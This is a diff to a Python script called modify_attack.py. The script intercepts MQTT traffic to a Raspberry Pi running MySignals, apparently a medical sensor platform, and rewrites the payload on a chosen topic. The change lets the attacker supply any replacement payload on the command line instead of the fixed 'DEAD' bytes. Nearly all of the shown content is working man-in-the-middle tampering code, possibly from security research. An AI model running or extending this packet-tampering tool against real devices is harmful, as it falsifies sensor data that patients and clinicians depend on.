@@ -4,7 +4,8 @@ import os
 import sys
 
 TARGET_IP       =   ''   # Raspberry Pi w/ MySignals
-TOPIC           =   ''  # Target topic to modify
+TOPIC           =   ''   # Target topic to modify
+BOGUS_PAYLOAD    =  ''   # Replacement Payload
 
 # -----------------------------------------------------------------------------
 # Filter and Forward Packets
@@ -13,6 +14,7 @@ def pkt_handler(payload):
 
     global TARGET_IP
     global TOPIC
+    global BOGUS_PAYLOAD
 
     # Convert to scapy packet
     data = payload.get_payload()
@@ -32,14 +34,13 @@ def pkt_handler(payload):
             payload_end = len(mqtt) - 4
             payload_len = payload_end - payload_start + 1
 
-            # Modify payload to be DEAD
+            # Modify payload to be BOGUS_PAYLOAD
             byte_payload = bytes(pkt[scapy.TCP].payload)
             list_payload = list(byte_payload)
 
-            bogus_payload = [68, 69, 65, 68]
             for i in range(payload_len):
-                if i < len(bogus_payload):
-                    list_payload[len(list_payload) - (payload_len + 1) + i] = bogus_payload[i]
+                if i < len(BOGUS_PAYLOAD):
+                    list_payload[len(list_payload) - (payload_len + 1) + i] = ord(BOGUS_PAYLOAD[i])
                 else:
                     list_payload[len(list_payload) - (payload_len + 1) + i] = 32
 
@@ -98,15 +99,17 @@ def cpy_tcp_ip(pkt):
 # -----------------------------------------------------------------------------
 def main():
 
-    if(len(sys.argv) != 3):
-        print('error, sample invocation is: $python3 modify_attack.py <target_address> <topic>')
+    if(len(sys.argv) != 4):
+        print('error, sample invocation is: $python3 modify_attack.py <target_address> <topic> <payload>')
         sys.exit(-1)
 
     global TARGET_IP
     global TOPIC
+    global BOGUS_PAYLOAD
 
     TARGET_IP = sys.argv[1]           # Client address
-    TOPIC = sys.argv[2]            # Broker Topic
+    TOPIC = sys.argv[2]               # Broker Topic
+    BOGUS_PAYLOAD = sys.argv[3]       # Replacement Payload
 
     # Save iptables rules for restore afterwards
     print('[*] Saving iptables')
